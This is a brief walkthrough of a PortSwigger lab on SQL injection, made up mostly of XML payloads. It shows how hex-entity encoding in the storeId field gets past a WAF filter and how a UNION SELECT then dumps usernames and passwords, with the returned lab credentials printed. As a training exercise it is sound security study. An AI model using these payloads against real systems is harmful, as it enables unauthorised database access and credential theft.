# Lab: SQL injection with filter bypass via XML encoding

# https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding

```bash
  <?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
<productId>
1</productId>
<storeId>
1 UNION SELECT NULL
</storeId>
</stockCheck>

# "Attack detected"
```
```bash
# We will use hackvector. Encode as hex_entities
<storeId>
<@hex_entities>
1 UNION SELECT NULL<@/hex_entities>
</storeId>


# 813 units
# null
```
```bash

<storeId>
<@hex_entities>
1 UNION SELECT username || ' ' || password from users <@/hex_entities>
</storeId>


administrator km19istcqbngmes4dg7h
wiener wxj5vi70szhn1w0se8wn
carlos ecs7vtufrojfbc0alz1w
813 units
``
